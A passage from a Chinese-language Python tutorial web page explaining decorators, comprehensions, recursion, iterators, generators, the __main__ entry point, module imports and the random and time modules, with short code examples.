<li>闭包是为了保存变量，该变量可以是所有类型的数据</li>
<li>装饰器保留的也是变量，只不过该变量是传进来的函数名，也就是相当于该变量是指向了一个函数的地址的（被装饰的函数）</li>
</ul>
<h4 id="5-10-2-装饰器的构造与调用"><a href="#5-10-2-装饰器的构造与调用" class="headerlink" title="5.10.2 装饰器的构造与调用"></a>5.10.2 装饰器的构造与调用</h4><p>装饰器的构造：</p>
<ul>
<li><p>分类：</p>
<ul>
<li>基本写法：只适合被装饰函数不接收参数的情况下</li>
<li>推荐写法：无论被装饰函数接不接收参数，都可以使用，这里只需要在内层函数和内层函数里的指向被装饰函数的变量的形参里写上万能参数 *args  **kwargs即可</li>
</ul>
</li>
<li><p>本质就是一个2层函数，外层函数必要要有形参，用来接收传递进来的被装饰函数的函数名</p>
</li>
<li><p>内层函数就是相当于是一个装饰器了，内层函数里面的代码必须要调用被修饰的函数，必须要对外层函数的形参进行调用（因为此时这个形参已经指向了被修饰函数）</p>
</li>
<li><p>可以在内层函数里进行添加修饰代码，该代码可以放在调用形参（函数）之前或者之后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#基本写法：只适合被装饰函数无参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">x</span>):</span>   <span class="comment">#外层函数，必须要有形参x，接收传来的被装饰函数的内存地址</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span>  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;这是修饰语句1，可以放在操作被修饰函数之前&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> x()   <span class="comment">#调用x就相当于调用其指向的被修饰函数，return可以不写，这里是为了接收被修饰参数的返回值</span></span><br><span class="line">        <span class="comment"># print(&#x27;这是修饰语句2，可以放在操作被修饰函数之后&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;这是装饰器的最基本格式&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#推荐写法：用万能形参来接收参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">*args,**kwargs</span>):</span>   <span class="comment">#这是外部用来调用的函数，如果想被装饰函数接收参数，这里也必须要接收参数，否则其内部的被装饰函数无法接收到函数</span></span><br><span class="line">        <span class="keyword">return</span> x(*args,**kwargs)   <span class="comment"># inner传递过来的参数再传递给被装饰函数进行执行  </span></span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(args,kwargs)</span><br><span class="line">y = fun(index)   <span class="comment">#将传递回来的inner函数地址赋值给y</span></span><br><span class="line">y(<span class="number">10</span>,a = <span class="number">16</span>)   <span class="comment">#传递参数，相当于调用inner，结果为：(10,) &#123;&#x27;a&#x27;: 16&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>装饰器的调用：</p>
<ul>
<li><p>前提：装饰器已经构造好</p>
</li>
<li><p>基本格式：   @ + 装饰器的父级函数 </p>
</li>
<li><p>功能：执行@后面的函数，并将    ‘‘@ + 装饰器的父级函数’’    语句下面的定义的函数的函数名作为一个一个参数传递过去，当装饰器的父级函数执行完毕后，将其返回的装饰器的地址接收过来，赋值给    ‘‘@ + 装饰器的父级函数’’  语句下面的定义的函数的函数名，所以该函数名就不再指向被装饰的函数，而是指向被装饰函数的装饰器</p>
</li>
<li><p>易错点：</p>
<ul>
<li>@ + 函数名        后面没有括号</li>
<li>@ + 函数名     语句下面一定要紧跟定义函数的语句</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#装饰器的调用def fun(x):    def inner(*args,**kwargs):   #该函数相当于被装饰函数index的装饰器        return x(*args,**kwargs)   # inner传递过来的参数再传递给被装饰函数进行执行    return inner    #返回装饰器的地址&#x27;&#x27;&#x27;@ + 函数   一共有2个功能1、执行函数fun，并将变量名index作为fun()的参数，相当于执行fun(index)2、将fun(index)执行后的结果得返回值赋值给 “@ + 函数()”语句下面定义的函数名，也就是相当于将返回的装饰器地址inner赋值给了index，    也就是 index = inner    &#x27;&#x27;&#x27;@fun          #注意，fun后面没有括号()，并且该语句后面必须要紧跟定义函数的语句def index(*args,**kwargs):    print(args,kwargs)index(16)   #这里执行x就相当于执行装饰器inner，所以结果为：(16,) &#123;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>装饰器的小应用：</p>
<ul>
<li><p>需求：</p>
<p>计算多个函数执行的时间</p>
</li>
<li><p>优点：虽然不使用装饰器也可以实现，但是如果需要计算很多个函数的执行时间，那么工程量就会很大，如果用装饰器的话，只需要构造一个装饰器，再加上调用即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#计算多个函数执行的时间import time #导入时间模块，用于计算时间def fun(x):    def inner(*args,**kwargs):        begin = time.time()   #获取函数执行之前的时间戳        x()        end = time.time()    #获取函数执行完毕后的时间戳        print(&#x27;程序执行完毕，用时%s秒&#x27;%(end - begin,))    return inner    #这里一定不能加括号@fun         #调用装饰器def index():    print(&#x27;666&#x27;)    time.sleep(2)   #方便计算程序执行时间，这里加个延迟2秒@fun        #调用装饰器def index1():    print(&#x27;999&#x27;)    time.sleep(3)       #方便计算程序执行时间，这里加个延迟3秒index()     #结果为：666        程序执行完毕，用时2.0001144409179688秒index1()        #结果为：999        程序执行完毕，用时3.000171661376953秒</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="5-10-3-带参数的装饰器"><a href="#5-10-3-带参数的装饰器" class="headerlink" title="5.10.3 带参数的装饰器"></a>5.10.3 带参数的装饰器</h4><p>在实际中主要的功能：起到开关的作用，接收的参数相当于是一个开关，不同的开关，则对装饰器进行不同的操作</p>
<p>与普通装饰器的区别：</p>
<ul>
<li><p>结构的区别：</p>
<p>普通装饰器：两层函数</p>
<p>带参数的装饰器：三层函数</p>
</li>
<li><p>调用时格式的区别：</p>
<p>普通装饰器：@ + 函数名</p>
<p>带参数的装饰器：@ + 函数名 + (参数)</p>
</li>
<li><p>调用时功能的区别：</p>
<p>普通装饰器： @fun  </p>
<ul>
<li>将@fun下面定义的函数名B作为参数传递给fun函数，并执行fun函数</li>
<li>将执行fun函数后的返回值(装饰器的地址)赋值给B</li>
</ul>
<p>带参数的装饰器：@fun(9)</p>
<ul>
<li>执行fun(9)，请注意，此时传递过去的参数时9，然后将第二层函数的地址返回给fun（那么此时fun就指向第二层函数的地址）</li>
<li>将@fun(9)下面定义的函数名B作为参数传递给fun函数（第二层函数）进行执行</li>
<li>将执行后返回的装饰器地址（第三层函数的地址）返回赋值给函数名B</li>
</ul>
</li>
</ul>
<p>应用实例：</p>
<ul>
<li><p>通过不同的开关True，False来让装饰器执行不同的操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flag为True，则 让原函数执行后返回值加100，并返回。# flag为False，则 让原函数执行后返回值减100，并返回。def x(status):    def change(fun):        def inner(*args,**kwargs):            if status == True:   #满足条件就执行，并且结束函数                return fun() + 100            return fun() - 100    #不满足条件，就执行减法        return inner    return change@x(True)       #待参数的装饰器，主要起到开关的作用def f1():    return 11@x(False)def f2():    return 22r1 = f1()print(r1)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>获取被装饰函数的函数名</p>
<ul>
<li><p>语法：    装饰器保留的变量（指向被装饰函数）    +   点（.）  +  两个横杠(__)   +  name  +   两个横杠</p>
</li>
<li><p>注意点：获取的是函数的名字，而不是函数名指向的地址</p>
<p>​                name前是两个横杠</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">x</span>):</span>    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">*args,**kwargs</span>):</span>        x()        <span class="built_in">print</span>(<span class="string">&#x27;获取到的被装饰函数名是：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(x.__name__))   <span class="comment">#打印被装饰函数的函数名，结果为：ceshi；注意，name前面和后面都是 两个横杠    return inner@fundef ceshi():    print(&#x27;获取被装饰函数的函数名,结果如下：&#x27;)ceshi()</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5-11-推导式"><a href="#5-11-推导式" class="headerlink" title="5.11  推导式"></a>5.11  推导式</h3><p> 目的：对一个序列里的所有元素进行相同的操作，然后将操作后的元素加入到一个新列表中，最终的结果是一个列表</p>
<p>基本格式：</p>
<ul>
<li><p>格式一：    i    for    i    in    可迭代对象        </p>
<p>功能：对i执行append操作</p>
</li>
<li><p>格式二： i    for    i    in    可迭代对象     if    条件 </p>
<p>功能：如果条件为True，那么才对i执行append操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#推导式：筛选a = [lambda   :i*20 for i in range(5) if i &gt; 0 ]#如果i&gt;0，就将lambda语句所代表的函数地址加入到列表中，如果不满足条件，则不加入print(a[0]())   #结果为：40print(a[1]())   #结果为：40</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>分类：</p>
<ul>
<li><p>列表推导式、集合推导式</p>
<p>目的：对一个序列里的所有元素进行相同的操作，然后将操作后的元素加入到一个新列表（集合）中，最终的结果是一个列表（集合）</p>
<p>特点：列表推导式表达式必须要在列表里；结合推导式语句必须要在集合里;</p>
<p>用法：列表推导式和集合推导式用法一样</p>
<p>格式：[     操作A的语句   for     A     in     一个范围(例如：range(5) )                  ]</p>
<p>​            操作A的语句可以是函数，表达式，三元运算，lambda表达式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#列表推导式：表达式必须在列表里a = [i+10 for i in range(3) ]  print(a)    #结果为：[10,11,12]#将每一个循环的i进行操作(+10)，然后将操作后的结果作为一个元素加入到一个列表中#集合推导式：表达式必须在集合里a = &#123;i+10 for i in range(3) &#125;print(a)   #结果为：&#123;10, 11, 12&#125;#将每一个循环的i进行操作(+10)，然后将操作后的结果作为一个元素加入到一个集合中</span></span><br></pre></td></tr></table></figure></li>
<li><p>字典推导式</p>
<p>区别：for语句必须要在字典的值的位置，操作A的语句既可以放在键的位置，也可以放在值的位置</p>
<p>功能：将操作后的键值对加入到一个 新字典中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#字典推导式：操作语句既可以在键里，也可以在值里a = &#123;i+10 : i for i in range(3) &#125; #每次循环得到的i都交给键和值去操作，然后将操作后的键值对加入到一个新的字典中print(a)   #结果为：&#123;10: 0, 11: 1, 12: 2&#125;#每一次循环，将操作后的键和值作为一个键值对加入到一个新字典中</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5-12-递归"><a href="#5-12-递归" class="headerlink" title="5.12 递归"></a>5.12 递归</h3><p>本质：函数自己调自己</p>
<p>特性：占用内存大，效率低</p>
<p>关键：有返回值</p>
<p>python中默认递归次数：1000次</p>
<p>怎么查看python递归次数：在sys模块中查看</p>
<ul>
<li> sys.getrecursionlimit()</li>
</ul>
<h3 id="5-13-迭代器"><a href="#5-13-迭代器" class="headerlink" title="5.13 迭代器"></a>5.13 迭代器</h3><p>功能：遍历可迭代对象(列表、元组这些都是可迭代对象)里的每一个元素</p>
<p>迭代器的标志：</p>
<ul>
<li>有下面这个next方法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__next__</span><br></pre></td></tr></table></figure>

<ul>
<li> 看它的数据类型，type来查看，如果它的数据类型是 iterator 那么就是迭代器</li>
</ul>
<p>生成迭代器：</p>
<ul>
<li><p>前提：必须是可迭代对象</p>
</li>
<li><p>用iter方法来生成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lis = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]     <span class="comment">#可迭代对象print(type(lis))   #结果为：list#方法一：a = iter([1,2,3])a = iter(lis)     #生成迭代器#方法二：[1,2,3].__iter__()b = lis.__iter__()    #生成迭代器print(type(a))   #结果为：&lt;class &#x27;list_iterator&#x27;&gt;print(type(b))   #结果为：&lt;class &#x27;list_iterator&#x27;&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>可迭代对象：须同时满足下面的条件</p>
<ul>
<li>可以被for循环</li>
<li>有iter方法</li>
<li>使用iter方法后返回的是一个迭代器</li>
</ul>
<p>调用迭代器的方法：</p>
<ul>
<li>注意点：next方法可以一个一个的将迭代器里的值取出，但是如果最后没有值可以取，那么程序就会报错，但是之前取出的值还是可以取出来</li>
<li>使用next方法来调用</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过__next__()来调用迭代器，一个一个的内部取值，然后打印，如果没有值了，就报错lis = [1,2,3]b = lis.__iter__()    #生成迭代器while True :    #循环用next来取值    print(b.__next__())  #结果为：1,2,3   并且报错</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>解决没有值可以取从而报错的方法：</p>
<p>通过异常处理来解决</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用异常处理解决无值可取时出现的报错lis = [1,2,3]b = lis.__iter__()    #生成迭代器while True :    #循环用next来取值    try:        print(b.__next__())      except Exception as f :        break    #如果报错，即所有的值取完了，那么就终止循环#最终结果为：1,2,3    但是并没有报错</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>for循环和迭代器的关系：</p>
<ul>
<li><p>for循环的本质：for 循环一个可迭代对象，其函数内部执行了以下几个步骤：</p>
<p>将可迭代对象转换为迭代器</p>
<p>通过迭代器的方法next来一个一个取值</p>
<p>进行异常处理，避免报错</p>
</li>
</ul>
<h3 id="5-14生成器"><a href="#5-14生成器" class="headerlink" title="5.14生成器"></a>5.14生成器</h3><h4 id="5-14-1-生成器基础"><a href="#5-14-1-生成器基础" class="headerlink" title="5.14.1 生成器基础"></a>5.14.1 生成器基础</h4><p>标志：只要函数里有yield，那么该函数就是一个生成器</p>
<p>生成器的特性：生成器必须要配合for使用，如果没有for，那么生成器内部的代码不执行</p>
<p>yield的特性：语句从上往下执行，碰到yield就直接将yield后面接的数据返回，返回的数据直接传给了 for 后面的变量，然后接着开始第二轮循环，接着上次执行的位置，接着往下执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成器的标志：yielddef fun():    #有yield的函数就是一个生成器    print(&#x27;666&#x27;)    yield 1    #返回1，将1传给 i    yield 2   #接着上次执行的位置，接着向下执行，所以此时yield 2for i in fun():    print(i)   #结果为：666   1    2</span></span><br></pre></td></tr></table></figure>



<h4 id="5-14-2-生成器和迭代器的关系"><a href="#5-14-2-生成器和迭代器的关系" class="headerlink" title="5.14.2 生成器和迭代器的关系"></a>5.14.2 生成器和迭代器的关系</h4><ul>
<li><p>调用生成器即   上个例子中的  fun()    ，会生成一个生成器，即fun()这个整体就是一个生成器</p>
<p>原因：</p>
<ul>
<li><p>fun()这个整体是一个生成器，但是它内部有next方法，所以它也是一个特殊的迭代器</p>
</li>
<li><p>fun()这个整体既可以被for循环，并且其还有iter方法，并且其使用iter方法后返回的值有next方法，所以返回的还是一个迭代器，所以fun()这个整体也可以说是一个可迭代对象</p>
</li>
</ul>
</li>
<li><p>易错点：如果一个函数的代码里有yield语句，那么该函数就是生成器，那么 函数名+()   就是一个生成器，所以必须要用for循环才能执行里面的代码</p>
</li>
<li><p>生成器既有生成数据的功能，也有迭代器的功能</p>
</li>
</ul>
<p>.</p>
<p>易错点：函数里第一个语句就是return，后面却有yield语句，那么它是生成器么？</p>
<ul>
<li><p>是生成器，只要函数代码里有yield，不管yield能不能执行，yield语句在哪里，该函数就是生成器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span>    <span class="keyword">return</span> 	<span class="keyword">yield</span> <span class="number">1</span>   <span class="comment">#该语句一辈子都不会执行，但是该函数还是生成器，因为有yield</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>小练习：用生成器生成1-1000之间的整数</p>
<ul>
<li><p>要求：不用range，不用while，只用生成器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成器生成500以内的数def fun(x):    yield x    for m in fun(x+1):     #因为fun()是生成器，必须要配合for使用        global COUNT  #找到全局变量        COUNT += 1   #修改全局变量        print(m)        if COUNT == 500 :  #1-500范围内的数            returnCOUNT = 1   #设置全局变量，用来设置范围for i in fun(1):    print(i)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>实际应用：</p>
<ul>
<li><p>需求：取大文件的内容，每次取10条，取回来后，每次返回1条</p>
</li>
<li><p>要求：用生成器来做</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 需求：取大文件的内容，每次取10条，取回来后，每次返回1条# 要求：用生成器来做import os,timedef read():   #生成器    position_current = 0    status = 1  #代表文本没有读完    while True :        with open(&#x27;生成器测试&#x27;,mode=&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as f :            size = os.stat(&#x27;生成器测试&#x27;).st_size  #获取文件的大小            f.seek(position_current)    #移动光标位置，从上次获取的最后一个位置继续往下获取            message_total = []    #用来储存10条信息            for i in range(10):   #循环取10条信息                message_pice = f.readline().strip()  #每一条信息去除空格                if position_current == size :   #如果光标的位置等于文件的大小，则代表文件读完了                    status = 0            #文件读完了，修改开关为读完的状态，并跳出循环                    break                message_total.append(message_pice)   #将获取的每一条信息添加到列表里            position_current = f.tell() #读取完了10条后，获取最后一个光标位置        for message in message_total :            yield message    #一条一条的返回            time.sleep(0.01)  #延迟0.01秒，方便观看结果        if status == 0:      #如果开关是读完了的状态，就退出循环，所有文件都读取完毕了            breakfor m in read():    print(m)</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>生成器调用生成器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#从当前生成器调用其他的生成器def fun():    &#x27;&#x27;&#x27;    生成器1    :return:    &#x27;&#x27;&#x27;    yield 1    for m in inner() :    #inner()就是一个生成器，所以也需要用for来取值        yield m    yield 3def inner():    &#x27;&#x27;&#x27;    生成器2    :return:    &#x27;&#x27;&#x27;    yield &#x27;sb&#x27;for v in fun():    print(v)</span></span><br></pre></td></tr></table></figure>



<h4 id="5-14-3-生成器的推导式"><a href="#5-14-3-生成器的推导式" class="headerlink" title="5.14.3 生成器的推导式"></a>5.14.3 生成器的推导式</h4><p>基本格式：( i for i in rang(10) )</p>
<p>生成器推导式和列表推导式的区别:</p>
<ul>
<li><p>区别：生成器推导式可以保留每一轮循环的数据，而列表推导式则不行</p>
</li>
<li><p>生成器推导式：</p>
<p>特点：可以保留每一轮循环产生的数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成器推导式：注意是小括号#特点：可以每一轮产生的不同的数据num = ( lambda : i for i in range(3))   #得到的是一个生成器for m in num:                   #所以需要配合for来取值，保留了每一个i    print(m())#等价于下面的函数fundef fun():    for i in range(3):        yield lambda : ifor n in fun():    print(n())</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>列表推导式：</p>
<p>特点：无法保留数据，数据的最终结果取决于循环结束后的最新的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#列表生成器#特点：无法保留数据，最终的数据取决于最新的数据num = [ lambda : i for i in range(3) ]  #得到的是一个列表for m in num:                   #所以需要配合for来取值，保留了每一个i    print(m())           #结果为：2  2  2#等价于下面的函数fundef fun():    a = []    for i in range(3):        a.append(lambda : i)    return afor n in fun():    print(n())             #最终结果取决于i的最新值，所以结果为：2   2  2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5-15-主文件"><a href="#5-15-主文件" class="headerlink" title="5.15 主文件"></a>5.15 主文件</h3><p>定义：就是主程序，程序的入口</p>
<p>标志：main</p>
<p>查看方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#执行__name__  如果结果为__main__  则代表当前运行的脚本是主文件，如果结果为脚本名，那么则代表该脚本不是主文件#在当前脚本里运行print(__name__)   查看打印的结果，如果结果为：__main__  则代表当前运行的脚本是主文件#主文件print(__name__)   #结果为：__main__&#x27;&#x27;&#x27;hello模块代码如下：def p():    print(__name__)   #判断hello模块是不是主文件&#x27;&#x27;&#x27;#判断模块hello是不是主文件，经过判断：hello不是主文件import hellohello.p()    #调用hello模块里的方法p#结果为：hello，所以hello模块不是主文件</span></span><br></pre></td></tr></table></figure>



<p>构造主文件入口：</p>
<ul>
<li>手动输入</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#构造主文件入口#如果当前文件是主文件，则执行代码if __name__ == &#x27;__main__&#x27;:    pass</span></span><br></pre></td></tr></table></figure>

<ul>
<li>快捷输入：pycharm里输入main，然后回车即可自动补全</li>
</ul>
<h2 id="第六章-模块"><a href="#第六章-模块" class="headerlink" title="第六章 模块"></a>第六章 模块</h2><h3 id="6-1-模块和函数"><a href="#6-1-模块和函数" class="headerlink" title="6.1 模块和函数"></a>6.1 模块和函数</h3><p>模块和函数的关系：模块就相当于一个py文件，该py文件里有很多同类型的函数</p>
<p>模块的分类：</p>
<ul>
<li>内置模块</li>
<li>第三方模块</li>
<li>自定义模块</li>
</ul>
<p>包和文件夹的区别：</p>
<ul>
<li><p>包定义：一个文件夹里有个init文件，那么它就是一个包；文件名字如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__init__.py</span><br></pre></td></tr></table></figure></li>
<li><p>如果文件夹里没有init文件，那么它就是一个普通的文件夹</p>
</li>
</ul>
<p>包在python2和python3中的区别：</p>
<ul>
<li><p>区别：</p>
<p>python2：需要用到包，包里必须要有init文件，如果没有它就是文件夹，那么就无法在python导入</p>
<p>python3：已经没有包这种说法，因为在python3中，支持从文件夹里导入模块，所以文件夹里不需要放入init文件，也就是不需要包了</p>
</li>
<li><p>意见建议：建议在python3中创建文件夹用以导入模块时，在文件夹里放入init文件，防止程序代码放到python2中运行出错</p>
</li>
</ul>
<p>init文件：</p>
<ul>
<li><p>特点：文件具体内容可有可无，但是文件的名字必须要是以下这个名字才行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__init__.py</span><br></pre></td></tr></table></figure></li>
</ul>
<p>模块的导入：</p>
<p>相对导入：</p>
<ul>
<li>关键：利用符号 点  来实现   </li>
<li>缺点：必须要在当前运行脚本的下级目录才行</li>
<li>应用场景：当我们导入自定义模块A时，但是A又需要导入其他路径的模块，这时就可以在A里导入模块使用相对导入</li>
</ul>
<p>普通导入：</p>
<ul>
<li><p>特性：模块在导入的时候，模块里面的代码就执行了；比如，如果模块 x.py 里有个语句 print(‘hello!’)，那么一旦在脚本文件A里导入该模块，然后直接运行该A，此时A里只有一行代码,就是 import x    ，在这种情况下运行A，结果为    hello!</p>
</li>
<li><p>导入方法：</p>
<p>适用场景：</p>
<ul>
<li>如果模块和脚本处于同一级目录，并且需要使用该模块里的很多函数时，可以使用 import 模块</li>
<li>其他的场景，统一推荐使用    from    包   import   模块       这种写法</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导入模块：import run     #前提：run是一个模块文件；导入os模块import run,x    #同时导入两个模块from run import x,y   #前提：run是一个包；导入包run里的x和y模块from run.python import x,y #前提：run、python都是一个包； 包run里的包python里的x,y模块#导入模块里的函数from run import x    #前提：run是一个模块；导入run模块里的指定函数   xfrom run import *    #前提：run是一个模块；导入run模块里的所有函数from run.python import *   #前提：run是一个包并且python是一个具体的模块；导入包run里的python模块里的所有函数#特殊情况：run是一个包import run    #前提：run是一个包，无论run里有多少个模块，这里都默认导入__init__.py模块from run import *   #前提：run是一个包，无论run里有多少个模块，这里都默认导入__init__.py模块里的所有函数</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>疑难点：在导入模块里的一个特定函数时，如果该函数的函数名和我们脚本文件里自定义的函数名相同怎么办？</p>
<p>解决方法：如果函数名相同，就会产生冲突，所以我们需要在导入模块里的函数名处下手，可以将该函数名赋予以一个另外的名字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> run <span class="keyword">import</span> x  <span class="keyword">as</span>  y   <span class="comment">#将有冲突的函数名，传递给y，这样就不会和我们自定义的函数起冲突了def x():    pass</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>练习题1：</p>
<ul>
<li>```python<br>脚本所在目录day16/moudle模块所在目录：day16/testimport osimport sysscrip_path = os.path.abspath(‘模块导入2.py’)   #脚本所在的绝对路径scrip_path = os.path.dirname(scrip_path)   #获取脚本文件所在目录scrip_path = os.path.dirname(scrip_path)   #获取脚本文件的上级目录sys.path.append(scrip_path)     #将路径添加到解释器找模块的默认路径中，这里添加day16这个路径from day16.test import old    #这里from一定要从最顶级目录开始写old.message()<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">脚本和模块所在位置图片：</span><br><span class="line"></span><br><span class="line">![image-20200504142858590](https://gitee.com/python_road/python_img/raw/master/img/20200504142900.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">练习题2：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#导入当前脚本所在的路径里的test包里的模块oldfrom test import old   #test和脚本文件在同一级目录old.message()</span><br></pre></td></tr></table></figure></li>
</ul>
<p>脚本和模块所在位置图片：</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200504143206.png" alt="image-20200504143204704"></p>
<p>练习题3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导入当前脚本所在的路径里的模块ximport x   #x和脚本文件在同一级目录x.message()</span></span><br></pre></td></tr></table></figure>

<p>脚本和模块所在位置图片：</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200504143322.png" alt="image-20200504143320389"></p>
<p>调用模块里的函数：</p>
<ul>
<li><p>首先导入模块（意思就是导入py文件）</p>
</li>
<li><p>接着调用模块里的函数，用点 ‘.’来表示从属关系，比如：random.randint()表示调用random模块里的randint()函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import  模块名# 模块名.函数名import randomnum = random.randint(1,10)   #调用模块random里的randint()函数随机生成一个1到10之间的整数</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6-2-模块"><a href="#6-2-模块" class="headerlink" title="6.2 模块"></a>6.2 模块</h3><h4 id="6-2-1-random模块"><a href="#6-2-1-random模块" class="headerlink" title="6.2.1 random模块"></a>6.2.1 random模块</h4><p>模块特点：生成随机数</p>
<p>常用函数：</p>
<ul>
<li>randint(1,10)：随机生成一个1到10之间的整数，包含1和10</li>
<li>randrange(1,10)：随机生成一个1到10之间的整数，不包含10</li>
</ul>
<p>练习题：</p>
<ul>
<li><p>定义一个函数，功能是生成随机验证码，接收的参数为验证码的长度，也可以设置一个默认参数表示长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> randomdef verification_code(length = <span class="number">7</span>):    <span class="string">&#x27;&#x27;&#x27;生成随机验证码:默认7位小写字母的组合&#x27;&#x27;&#x27;</span>    result = <span class="string">&#x27;&#x27;</span>    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):        number = random.randint(<span class="number">97</span>,<span class="number">122</span>)   <span class="comment">#随机生成a到z包括z所代表的数字        code = chr(number)    #将数字转换为字符        result += code    #进行验证码拼接    return resultcode_random = verification_code()print(code_random)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="6-2-2-time和datatime模块"><a href="#6-2-2-time和datatime模块" class="headerlink" title="6.2.2 time和datatime模块"></a>6.2.2 time和datatime模块</h4><p>模块特点：和时间相关</p>
<p>time模块常用函数：</p>
<ul>
<li><p>time()：获取从1970年1月1日到现在的时间戳，单位是秒</p>
<p>注意点：时间戳是基于格林尼治的1970年1月1日起算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timedata = time.time()<span class="built_in">print</span>(data)  <span class="comment">#结果为：1587782765.8132167</span></span><br></pre></td></tr></table></figure></li>
<li><p>sleep(数字)：休息多少秒，sleep(5)表示休息5秒</p>
</li>
<li><p>当前时区的时间和格林林芝时间相比，过去了多少秒：</p>
<p>易错点：当前时区的判定并不根据人所处的实际位置，而是和计算机的时区设置有关，电脑里的时区是可以更改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeprint(time.timezone)  <span class="comment">#结果为：-28800秒，也就是我们的时间减去28800秒（8小时），就是格林尼治时间</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p> 时间分类：</p>
<ul>
<li><p>本地时间</p>
<p>就是当前时区的时间</p>
</li>
<li><p>格林尼治时间</p>
<p>UTC时间：主流使用，相比GMT更精确</p>
<p>GMT时间：和UTC时间差不多，只不过精确度没有UTC搞</p>
</li>
</ul>
<p>datetime模块常用函数：</p>
<ul>
<li><p>获取当前时区的时间：</p>
<p>注意点：获取到的数据的类型是：datetime类型</p>
<p>datetime类型时间：</p>
<ul>
<li><p>优点：可以直接进行时间的加减，比如加156天，年份和月份会自动变更</p>
</li>
